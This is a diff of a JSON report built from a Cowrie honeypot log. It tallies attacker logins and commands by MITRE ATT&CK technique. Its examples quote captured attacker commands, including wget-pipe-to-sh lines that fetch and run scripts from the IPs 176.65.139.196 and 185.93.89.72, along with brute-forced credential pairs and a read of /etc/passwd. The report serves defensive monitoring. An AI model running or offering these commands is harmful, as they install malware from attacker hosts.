@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-19 10:03:12",
+  "generated": "2026-09-19 11:04:45",
   "totals": {
-    "commands": 3326,
-    "login_failed": 4238,
-    "login_success": 982,
-    "sessions": 4439
+    "commands": 3374,
+    "login_failed": 4999,
+    "login_success": 998,
+    "sessions": 5240
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4238,
+      "count": 4999,
       "examples": [
         "praktikant / praktikant",
         "tom / 1234567",
@@ -21,14 +21,14 @@
         "cugweb / cugweb"
       ],
       "first": "2026-09-19T00:00:21.957099Z",
-      "last": "2026-09-19T10:02:02.461220Z",
-      "unique_ips": 70
+      "last": "2026-09-19T11:04:43.060400Z",
+      "unique_ips": 75
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 982,
+      "count": 998,
       "examples": [
         "ubuntu / ubuntu",
         "root / 111111",
@@ -37,8 +37,8 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-09-19T00:14:11.463012Z",
-      "last": "2026-09-19T09:41:44.561673Z",
-      "unique_ips": 56
+      "last": "2026-09-19T11:03:54.861557Z",
+      "unique_ips": 62
     },
     {
       "id": "T1083",
@@ -59,7 +59,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 219,
+      "count": 222,
       "examples": [
         "uname -a",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -68,14 +68,14 @@
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
       ],
       "first": "2026-09-19T00:14:23.179042Z",
-      "last": "2026-09-19T09:41:45.526460Z",
-      "unique_ips": 35
+      "last": "2026-09-19T11:03:55.034734Z",
+      "unique_ips": 37
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 91,
+      "count": 92,
       "examples": [
         "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh",
         "http://176.65.139.196/bins/kla.sh",
@@ -84,14 +84,14 @@
         "cd /tmp || cd /var/tmp || cd /; busybox wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
       ],
       "first": "2026-09-19T01:53:50.389299Z",
-      "last": "2026-09-19T08:32:01.775833Z",
-      "unique_ips": 27
+      "last": "2026-09-19T10:30:20.061943Z",
+      "unique_ips": 28
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 75,
+      "count": 76,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va",
@@ -100,36 +100,38 @@
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
       ],
       "first": "2026-09-19T00:16:07.027079Z",
-      "last": "2026-09-19T09:41:45.526460Z",
-      "unique_ips": 30
+      "last": "2026-09-19T10:30:20.061943Z",
+      "unique_ips": 31
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 49,
+      "count": 50,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "w",
-        "whoami"
+        "whoami",
+        "id"
       ],
       "first": "2026-09-19T00:16:07.027079Z",
-      "last": "2026-09-19T09:41:45.526460Z",
-      "unique_ips": 27
+      "last": "2026-09-19T10:30:19.564812Z",
+      "unique_ips": 28
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 46,
+      "count": 47,
       "examples": [
         "crontab -l",
-        "top"
+        "top",
+        "echo \"###OS###\"; (. /etc/os-release 2>/dev/null && echo \"$PRETTY_NAME\") 2>/dev/null || cat /etc/issue 2>/dev/null | head"
       ],
       "first": "2026-09-19T05:02:00.476441Z",
-      "last": "2026-09-19T08:32:18.685047Z",
-      "unique_ips": 23
+      "last": "2026-09-19T11:03:55.034734Z",
+      "unique_ips": 24
     },
     {
       "id": "T1098.004",
@@ -183,6 +185,18 @@
       "unique_ips": 3
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-19T10:30:19.569738Z",
+      "last": "2026-09-19T10:30:19.569738Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1140",
       "name": "Deobfuscate/Decode Files or Information",
       "tactic": "Defense Evasion",
@@ -198,11 +212,27 @@
   "unmapped": [
     [
       "sh",
-      921
+      922
     ],
     [
       "system",
-      918
+      919
+    ],
+    [
+      "zalee",
+      10
+    ],
+    [
+      "za",
+      10
+    ],
+    [
+      "&k`g&k|zpkfq)ES[M",
+      10
+    ],
+    [
+      "shell",
+      8
     ],
     [
       "echo WRITABLE >/tmp/.testfile 2>&1",
@@ -211,10 +241,6 @@
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       8
-    ],
-    [
-      "shell",
-      7
     ],
     [
       "rm -f /tmp/.testfile",
@@ -245,6 +271,10 @@
       4
     ],
     [
+      "enable",
+      4
+    ],
+    [
       "echo INFECT_CHECK",
       4
     ],
@@ -257,24 +287,8 @@
       3
     ],
     [
-      "enable",
-      3
-    ],
-    [
       "/bin/busybox MKN4mnTD",
       3
-    ],
-    [
-      "/bin/busybox IZ1H9",
-      2
-    ],
-    [
-      "/bin/busybox",
-      2
-    ],
-    [
-      "linuxshell",
-      2
     ]
   ]
 }
